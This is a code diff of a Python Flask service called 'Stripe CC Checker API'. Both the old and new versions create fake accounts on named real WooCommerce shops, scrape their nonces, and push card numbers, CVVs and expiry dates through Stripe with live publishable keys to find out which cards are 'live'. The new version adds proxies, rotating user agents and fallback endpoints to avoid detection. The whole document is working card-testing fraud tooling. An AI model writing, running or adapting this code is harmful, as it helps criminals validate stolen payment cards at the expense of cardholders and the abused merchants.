@@ -1,454 +1,305 @@
 from flask import Flask, request, jsonify
 from flask_cors import CORS
-import requests
+import asyncio
+import re
 import json
 import random
-import re
-import asyncio
-import time
+import aiohttp
+from datetime import datetime
+import uuid
+import warnings
 from fake_useragent import UserAgent
 
 app = Flask(__name__)
 CORS(app)
 
+warnings.filterwarnings('ignore')
+
 # ==================== HELPER FUNCTIONS ====================
 
 def gets(s, start, end):
-    """Extract text between two strings"""
     try:
         start_index = s.index(start) + len(start)
         end_index = s.index(end, start_index)
         return s[start_index:end_index]
-    except ValueError:
+    except (ValueError, AttributeError):
         return None
 
-def get_between(text, start, end):
-    """Alternative extractor with better error handling"""
-    try:
-        pattern = re.compile(re.escape(start) + '(.*?)' + re.escape(end), re.DOTALL)
-        match = pattern.search(text)
-        if match:
-            return match.group(1)
-        return None
-    except:
-        return None
+def generate_random_email():
+    import string
+    username = ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 12)))
+    number = random.randint(100, 9999)
+    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com']
+    return f"{username}{number}@{random.choice(domains)}"
 
-async def get_random_info():
-    """Generate random email and user"""
-    return {
-        "email": f"user{random.randint(100000, 999999)}@gmail.com",
-        "username": f"user{random.randint(100000, 999999)}"
-    }
+def generate_guid():
+    return str(uuid.uuid4())
 
 # ==================== MAIN CHECK FUNCTION ====================
 
-async def check_cc(fullz):
-    """
-    Check a single credit card
-    Format: card_number|month|year|cvv
-    """
+async def process_stripe_card(card_data, proxy_url=None):
+    ua = UserAgent()
+    site_url = 'https://www.eastlondonprintmakers.co.uk/my-account/add-payment-method/'
     try:
-        # Parse card details
-        cc, mes, ano, cvv = fullz.split("|")
-        if len(ano) == 2:
-            ano = "20" + ano
-        
-        # Generate random user info
-        random_data = await get_random_info()
-        email = random_data["email"]
-        user = random_data["username"]
-
-        # Create session with proper headers
-        s = requests.Session()
-        
-        # Set default headers for all requests
-        default_headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.5',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1',
-        }
-        
-        # ============ STEP 1: Get Registration Nonce ============
-        headers = {
-            **default_headers,
-            'Referer': 'https://radio-tecs.com/',
-        }
-
-        print(f"🔍 Getting registration page for {cc[:6]}****{cc[-4:]}")
-        response = s.get('https://radio-tecs.com/my-account-2/', headers=headers, timeout=30)
-        
-        # Check if response is valid
-        if response.status_code != 200:
-            return {"status": "error", "message": f"Website returned status: {response.status_code}"}
-        
-        # Try multiple methods to get nonce
-        nonce = None
-        
-        # Method 1: Using gets function
-        nonce = gets(response.text, 
-                    '<input type="hidden" id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="', 
-                    '" />')
-        
-        # Method 2: Using regex
-        if not nonce:
-            nonce = get_between(response.text, 
-                               'name="woocommerce-register-nonce" value="', 
-                               '"')
-        
-        # Method 3: Search in entire page
-        if not nonce:
-            pattern = r'woocommerce-register-nonce" value="([^"]+)"'
-            match = re.search(pattern, response.text)
-            if match:
-                nonce = match.group(1)
-        
-        if not nonce:
-            print(f"❌ Nonce not found. Response length: {len(response.text)}")
-            return {"status": "error", "message": "Failed to get registration nonce"}
-
-        print(f"✅ Nonce found: {nonce[:20]}...")
-
-        # ============ STEP 2: Register Account ============
-        headers = {
-            **default_headers,
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Origin': 'https://radio-tecs.com',
-            'Referer': 'https://radio-tecs.com/my-account-2/',
-        }
-
-        data = {
-            'username': user,
-            'email': email,
-            'mailpoet[subscribe_on_register_active]': '1',
-            'wc_order_attribution_source_type': 'typein',
-            'wc_order_attribution_referrer': '(none)',
-            'wc_order_attribution_utm_campaign': '(none)',
-            'wc_order_attribution_utm_source': '(direct)',
-            'wc_order_attribution_utm_medium': '(none)',
-            'wc_order_attribution_utm_content': '(none)',
-            'wc_order_attribution_utm_id': '(none)',
-            'wc_order_attribution_utm_term': '(none)',
-            'wc_order_attribution_utm_source_platform': '(none)',
-            'wc_order_attribution_utm_creative_format': '(none)',
-            'wc_order_attribution_utm_marketing_tactic': '(none)',
-            'wc_order_attribution_session_entry': 'https://radio-tecs.com/',
-            'wc_order_attribution_session_start_time': '2025-08-29 09:50:42',
-            'wc_order_attribution_session_pages': '2',
-            'wc_order_attribution_session_count': '1',
-            'wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'woocommerce-register-nonce': nonce,
-            '_wp_http_referer': '/my-account-2/',
-            'register': 'Register',
-        }
-
-        print(f"📝 Registering user: {user}")
-        response = s.post('https://radio-tecs.com/my-account-2/', headers=headers, data=data, timeout=30)
-
-        # Check if registration was successful
-        if "register" in response.text.lower() and "error" in response.text.lower():
-            return {"status": "error", "message": "Registration failed - account may exist"}
-
-        # ============ STEP 3: Go to Payment Methods ============
-        headers = {
-            **default_headers,
-            'Referer': 'https://radio-tecs.com/my-account-2/',
-        }
-
-        print(f"🔍 Getting payment methods page")
-        response = s.get('https://radio-tecs.com/my-account-2/payment-methods/', headers=headers, timeout=30)
-
-        # ============ STEP 4: Get Add Payment Method Page ============
-        headers = {
-            **default_headers,
-            'Referer': 'https://radio-tecs.com/my-account-2/payment-methods/',
-        }
-
-        print(f"🔍 Getting add payment method page")
-        response = s.get('https://radio-tecs.com/my-account-2/add-payment-method/', headers=headers, timeout=30)
-        
-        # Get payment nonce
-        pnonce = None
-        
-        # Try multiple methods
-        pnonce = gets(response.text, '"createAndConfirmSetupIntentNonce":"', '"')
-        
-        if not pnonce:
-            pnonce = get_between(response.text, 'createAndConfirmSetupIntentNonce":"', '"')
-        
-        if not pnonce:
-            pattern = r'createAndConfirmSetupIntentNonce":"([^"]+)"'
-            match = re.search(pattern, response.text)
-            if match:
-                pnonce = match.group(1)
-        
-        if not pnonce:
-            return {"status": "error", "message": "Failed to get payment nonce"}
-
-        print(f"✅ Payment nonce found")
-
-        # ============ STEP 5: Create Payment Method on Stripe ============
-        headers = {
-            'Accept': 'application/json',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Origin': 'https://js.stripe.com',
-            'Referer': 'https://js.stripe.com/',
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-site',
-        }
-
-        data = {
-            'type': 'card',
-            'card[number]': cc,
-            'card[cvc]': cvv,
-            'card[exp_year]': ano,
-            'card[exp_month]': mes,
-            'allow_redisplay': 'unspecified',
-            'billing_details[address][country]': 'IN',
-            'payment_user_agent': 'stripe.js/e837b000d9; stripe-js-v3/e837b000d9; payment-element; deferred-intent',
-            'referrer': 'https://radio-tecs.com',
-            'key': 'pk_live_51JRJFgJNjZL6EJkQHeYkzBEpfeXNg9qADJwvdvXWpA3a2Dzl6TXIQwOLC3dyb56lGKSPNm8a0nTL8PlqFrHejIop00DUXcrpCK',
-            '_stripe_version': '2024-06-20',
-        }
-
-        print(f"💳 Creating payment method for {cc[:6]}****{cc[-4:]}")
-        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=30)
-        
-        if response.status_code != 200:
-            return {"status": "error", "message": f"Stripe API Error: {response.status_code}"}
-
-        try:
-            payment_id = response.json()['id']
-        except:
-            return {"status": "error", "message": "Failed to get payment ID from Stripe"}
-
-        print(f"✅ Payment method created: {payment_id[:10]}...")
-
-        # ============ STEP 6: Confirm Setup Intent ============
-        headers = {
-            'Accept': '*/*',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'Origin': 'https://radio-tecs.com',
-            'Referer': 'https://radio-tecs.com/my-account-2/add-payment-method/',
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'X-Requested-With': 'XMLHttpRequest',
-            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-        }
-
-        data = {
-            'action': 'wc_stripe_create_and_confirm_setup_intent',
-            'is_woopay_preflight_check': '0',
-            'payment_method': payment_id,
-            'wc-stripe-payment-method': payment_id,
-            'wc-stripe-payment-type': 'card',
-            '_ajax_nonce': pnonce,
-        }
-
-        print(f"✅ Confirming setup intent")
-        response = s.post('https://radio-tecs.com/wp-admin/admin-ajax.php', headers=headers, data=data, timeout=30)
-        
-        # ============ STEP 7: Parse Result ============
-        if response.status_code == 200:
-            try:
-                result = response.json()
-                if result.get('success'):
-                    return {
-                        "status": "approved", 
-                        "message": "Card is valid and approved"
-                    }
-                else:
-                    error_data = result.get('data', {})
-                    if isinstance(error_data, dict) and 'error' in error_data:
-                        error_msg = error_data['error'].get('message', 'Unknown error')
-                    else:
-                        error_msg = result.get('data', {}).get('message', 'Unknown error')
-                    return {
-                        "status": "declined", 
-                        "message": error_msg
-                    }
-            except json.JSONDecodeError:
-                if response.text.strip() == '0':
-                    return {
-                        "status": "declined", 
-                        "message": "Nonce verification failed"
-                    }
-                elif 'error' in response.text.lower():
-                    return {
-                        "status": "declined", 
-                        "message": response.text[:100]
-                    }
-                else:
-                    return {
-                        "status": "unknown", 
-                        "message": response.text[:100]
-                    }
-        else:
-            return {
-                "status": "error", 
-                "message": f"HTTP Error: {response.status_code}"
+        if not site_url.startswith('http'):
+            site_url = 'https://' + site_url
+        timeout = aiohttp.ClientTimeout(total=70)
+        connector = aiohttp.TCPConnector(ssl=False)
+        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
+            from urllib.parse import urlparse
+            parsed = urlparse(site_url)
+            domain = f"{parsed.scheme}://{parsed.netloc}"
+            email = generate_random_email()
+            headers = {
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+                'user-agent': ua.random
             }
-
+            resp = await session.get(site_url, headers=headers, proxy=proxy_url)
+            resp_text = await resp.text()
+            register_nonce = (gets(resp_text, 'woocommerce-register-nonce" value="', '"') or 
+                             gets(resp_text, 'id="woocommerce-register-nonce" value="', '"') or 
+                             gets(resp_text, 'name="woocommerce-register-nonce" value="', '"'))
+            if register_nonce:
+                username = email.split('@')[0]
+                password = f"Pass{random.randint(100000, 999999)}!"
+                register_data = {
+                    'email': email,
+                    'wc_order_attribution_source_type': 'typein',
+                    'wc_order_attribution_referrer': '(none)',
+                    'wc_order_attribution_utm_campaign': '(none)',
+                    'wc_order_attribution_utm_source': '(direct)',
+                    'wc_order_attribution_utm_medium': '(none)',
+                    'wc_order_attribution_utm_content': '(none)',
+                    'wc_order_attribution_utm_id': '(none)',
+                    'wc_order_attribution_utm_term': '(none)',
+                    'wc_order_attribution_utm_source_platform': '(none)',
+                    'wc_order_attribution_utm_creative_format': '(none)',
+                    'wc_order_attribution_utm_marketing_tactic': '(none)',
+                    'wc_order_attribution_session_entry': site_url,
+                    'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                    'wc_order_attribution_session_pages': '1',
+                    'wc_order_attribution_session_count': '1',
+                    'wc_order_attribution_user_agent': headers['user-agent'],
+                    'woocommerce-register-nonce': register_nonce,
+                    '_wp_http_referer': '/my-account/',
+                    'register': 'Register'
+                }
+                reg_resp = await session.post(site_url, headers=headers, data=register_data, proxy=proxy_url)
+                reg_text = await reg_resp.text()
+                if 'customer-logout' not in reg_text and 'dashboard' not in reg_text.lower():
+                    resp = await session.get(site_url, headers=headers, proxy=proxy_url)
+                    resp_text = await resp.text()
+                    login_nonce = gets(resp_text, 'woocommerce-login-nonce" value="', '"')
+                    if login_nonce:
+                        login_data = {
+                            'username': username,
+                            'password': password,
+                            'woocommerce-login-nonce': login_nonce,
+                            'login': 'Log in'
+                        }
+                        await session.post(site_url, headers=headers, data=login_data, proxy=proxy_url)
+            add_payment_url = site_url.rstrip('/') + '/add-payment-method/'
+            if '/my-account/add-payment-method' not in add_payment_url:
+                add_payment_url = f"{domain}/my-account/add-payment-method/"
+            headers = {'user-agent': ua.random}
+            resp = await session.get(add_payment_url, headers=headers, proxy=proxy_url)
+            payment_page_text = await resp.text()
+            add_card_nonce = (gets(payment_page_text, 'createAndConfirmSetupIntentNonce":"', '"') or 
+                             gets(payment_page_text, 'add_card_nonce":"', '"') or 
+                             gets(payment_page_text, 'name="add_payment_method_nonce" value="', '"') or 
+                             gets(payment_page_text, 'wc_stripe_add_payment_method_nonce":"', '"'))
+            stripe_key = (gets(payment_page_text, '"key":"pk_', '"') or 
+                         gets(payment_page_text, 'data-key="pk_', '"') or 
+                         gets(payment_page_text, 'stripe_key":"pk_', '"') or 
+                         gets(payment_page_text, 'publishable_key":"pk_', '"'))
+            if not stripe_key:
+                pk_match = re.search(r'pk_live_[a-zA-Z0-9]{24,}', payment_page_text)
+                if pk_match:
+                    stripe_key = pk_match.group(0)
+            if not stripe_key:
+                stripe_key = 'pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv'
+            elif not stripe_key.startswith('pk_'):
+                stripe_key = 'pk_' + stripe_key
+            stripe_headers = {
+                'accept': 'application/json',
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': 'https://js.stripe.com',
+                'referer': 'https://js.stripe.com/',
+                'user-agent': ua.random
+            }
+            stripe_data = {
+                'type': 'card',
+                'card[number]': card_data['number'],
+                'card[cvc]': card_data['cvc'],
+                'card[exp_month]': card_data['exp_month'],
+                'card[exp_year]': card_data['exp_year'],
+                'allow_redisplay': 'unspecified',
+                'billing_details[address][country]': 'AU',
+                'payment_user_agent': 'stripe.js/5e27053bf5; stripe-js-v3/5e27053bf5; payment-element; deferred-intent',
+                'referrer': domain,
+                'client_attribution_metadata[client_session_id]': generate_guid(),
+                'client_attribution_metadata[merchant_integration_source]': 'elements',
+                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
+                'client_attribution_metadata[merchant_integration_version]': '2021',
+                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
+                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
+                'client_attribution_metadata[elements_session_config_id]': generate_guid(),
+                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
+                'guid': generate_guid(),
+                'muid': generate_guid(),
+                'sid': generate_guid(),
+                'key': stripe_key,
+                '_stripe_version': '2024-06-20'
+            }
+            pm_resp = await session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, proxy=proxy_url)
+            pm_json = await pm_resp.json()
+            if 'error' in pm_json:
+                return False, pm_json['error']['message']
+            pm_id = pm_json.get('id')
+            if not pm_id:
+                return False, 'Failed to create Payment Method'
+            confirm_headers = {
+                'accept': 'application/json, text/javascript, */*; q=0.01',
+                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'origin': domain,
+                'x-requested-with': 'XMLHttpRequest',
+                'user-agent': ua.random
+            }
+            endpoints = [
+                {'url': f"{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", 'data': {'wc-stripe-payment-method': pm_id}},
+                {'url': f"{domain}/wp-admin/admin-ajax.php", 'data': {'action': 'wc_stripe_create_and_confirm_setup_intent', 'wc-stripe-payment-method': pm_id}},
+                {'url': f"{domain}/?wc-ajax=add_payment_method", 'data': {'wc-stripe-payment-method': pm_id, 'payment_method': 'stripe'}}
+            ]
+            for endp in endpoints:
+                if not add_card_nonce:
+                    continue
+                if 'add_payment_method' in endp['url']:
+                    endp['data']['woocommerce-add-payment-method-nonce'] = add_card_nonce
+                else:
+                    endp['data']['_ajax_nonce'] = add_card_nonce
+                endp['data']['wc-stripe-payment-type'] = 'card'
+                try:
+                    res = await session.post(endp['url'], data=endp['data'], headers=confirm_headers, proxy=proxy_url)
+                    text = await res.text()
+                    if 'success' in text:
+                        js = json.loads(text)
+                        if js.get('success'):
+                            status = js.get('data', {}).get('status')
+                            return True, f"Approved (Status: {status})"
+                        else:
+                            error_msg = js.get('data', {}).get('error', {}).get('message', 'Declined')
+                            return False, error_msg
+                except:
+                    continue
+            return False, 'Confirmation failed on site'
     except Exception as e:
-        return {
-            "status": "error", 
-            "message": str(e)
-        }
+        return False, f'System Error: {str(e)}'
+
+async def check_card(cc, mes, ano, cvv, proxy=None):
+    card_data = {'number': cc, 'exp_month': mes, 'exp_year': ano, 'cvc': cvv}
+    is_approved, response_msg = await process_stripe_card(card_data, proxy_url=proxy)
+    
+    response_lower = response_msg.lower()
+    
+    if 'requires_action' in response_lower or 'succeeded' in response_lower:
+        status = 'Approved'
+        is_live = True
+    elif is_approved:
+        status = 'Approved'
+        is_live = True
+    else:
+        status = 'Declined'
+        is_live = False
+    
+    return {
+        'cc': f"{cc}|{mes}|{ano}|{cvv}",
+        'status': status,
+        'response': response_msg,
+        'is_live': is_live
+    }
 
 # ==================== FLASK API ENDPOINTS ====================
 
 @app.route('/', methods=['GET'])
 def home():
     return jsonify({
-        "service": "CC Checker API",
-        "version": "3.1",
-        "description": "Check credit cards via Stripe",
+        "service": "Stripe CC Checker API",
+        "version": "1.0",
         "endpoints": {
             "/check": {
-                "GET": "/check?cc=CARD",
-                "POST": "JSON with card or cards"
+                "method": "GET",
+                "example": "/check?cc=4106210007965080|08|2029|130"
             },
-            "/health": "GET - Health check"
+            "/health": {
+                "method": "GET",
+                "description": "Health check"
+            }
         }
     })
 
-@app.route('/check', methods=['GET', 'POST'])
+@app.route('/check', methods=['GET'])
 def check_cards():
-    """Unified endpoint for GET and POST requests"""
+    """
+    GET: /check?cc=4106210007965080|08|2029|130
+    """
+    cc = request.args.get('cc')
     
-    # GET Request
-    if request.method == 'GET':
-        cc = request.args.get('cc')
-        
-        if not cc:
-            return jsonify({
-                "status": "error",
-                "message": "Missing 'cc' parameter",
-                "example": "/check?cc=4106210007965080|08|2029|130"
-            }), 400
-        
-        if "|" not in cc or len(cc.split("|")) != 4:
-            return jsonify({
-                "status": "error",
-                "message": "Invalid format. Use: number|month|year|cvv",
-                "example": "4106210007965080|08|2029|130"
-            }), 400
-        
-        try:
-            loop = asyncio.new_event_loop()
-            asyncio.set_event_loop(loop)
-            result = loop.run_until_complete(check_cc(cc))
-            loop.close()
-            
-            return jsonify({
-                "type": "single",
-                "card": cc,
-                "result": result,
-                "timestamp": time.time()
-            })
-            
-        except Exception as e:
-            return jsonify({
-                "status": "error",
-                "message": f"Server error: {str(e)}"
-            }), 500
+    if not cc:
+        return jsonify({
+            "status": "error",
+            "message": "Missing 'cc' parameter",
+            "example": "/check?cc=4106210007965080|08|2029|130"
+        }), 400
     
-    # POST Request
-    elif request.method == 'POST':
-        try:
-            data = request.get_json()
-            
-            if not data:
-                return jsonify({"status": "error", "message": "No JSON data"}), 400
-            
-            # Single card
-            if 'card' in data:
-                card = data['card']
-                
-                if "|" not in card or len(card.split("|")) != 4:
-                    return jsonify({
-                        "status": "error",
-                        "message": "Invalid format. Use: number|month|year|cvv"
-                    }), 400
-                
-                loop = asyncio.new_event_loop()
-                asyncio.set_event_loop(loop)
-                result = loop.run_until_complete(check_cc(card))
-                loop.close()
-                
-                return jsonify({
-                    "type": "single",
-                    "card": card,
-                    "result": result,
-                    "timestamp": time.time()
-                })
-            
-            # Bulk cards
-            elif 'cards' in data:
-                cards = data['cards']
-                
-                if not isinstance(cards, list) or len(cards) == 0:
-                    return jsonify({"status": "error", "message": "Invalid cards array"}), 400
-                
-                results = []
-                for card in cards[:50]:  # Max 50 cards
-                    if "|" not in card or len(card.split("|")) != 4:
-                        results.append({
-                            "card": card,
-                            "result": {"status": "error", "message": "Invalid format"}
-                        })
-                        continue
-                    
-                    loop = asyncio.new_event_loop()
-                    asyncio.set_event_loop(loop)
-                    result = loop.run_until_complete(check_cc(card))
-                    loop.close()
-                    
-                    results.append({"card": card, "result": result})
-                
-                return jsonify({
-                    "type": "bulk",
-                    "total": len(results),
-                    "results": results,
-                    "timestamp": time.time()
-                })
-            
-            else:
-                return jsonify({
-                    "status": "error",
-                    "message": "Send 'card' or 'cards' in request",
-                    "example": {"card": "4106210007965080|08|2029|130"}
-                }), 400
-                
-        except Exception as e:
-            return jsonify({"status": "error", "message": str(e)}), 500
+    parts = cc.split('|')
+    if len(parts) != 4:
+        return jsonify({
+            "status": "error",
+            "message": "Invalid format. Use: number|month|year|cvv",
+            "example": "4106210007965080|08|2029|130"
+        }), 400
+    
+    try:
+        cc_num, mes, ano, cvv = parts
+        
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        result = loop.run_until_complete(check_card(cc_num, mes, ano, cvv))
+        loop.close()
+        
+        return jsonify({
+            "card": result['cc'],
+            "status": result['status'],
+            "response": result['response'],
+            "is_live": result['is_live'],
+            "timestamp": datetime.now().isoformat()
+        })
+        
+    except Exception as e:
+        return jsonify({
+            "status": "error",
+            "message": str(e)
+        }), 500
 
 @app.route('/health', methods=['GET'])
 def health_check():
     return jsonify({
         "status": "healthy",
-        "version": "3.1",
-        "timestamp": time.time()
+        "timestamp": datetime.now().isoformat()
     })
+
+@app.errorhandler(404)
+def not_found(e):
+    return jsonify({
+        "status": "error",
+        "message": "Endpoint not found"
+    }), 404
 
 if __name__ == '__main__':
     print("=" * 50)
-    print("🔥 CC Checker API v3.1")
+    print("Stripe CC Checker API")
     print("=" * 50)
-    print("GET:  /check?cc=4106210007965080|08|2029|130")
-    print("POST: /check with JSON body")
+    print("GET: /check?cc=4106210007965080|08|2029|130")
+    print("GET: /health")
     print("=" * 50)
     app.run(host='0.0.0.0', port=5000, debug=True)
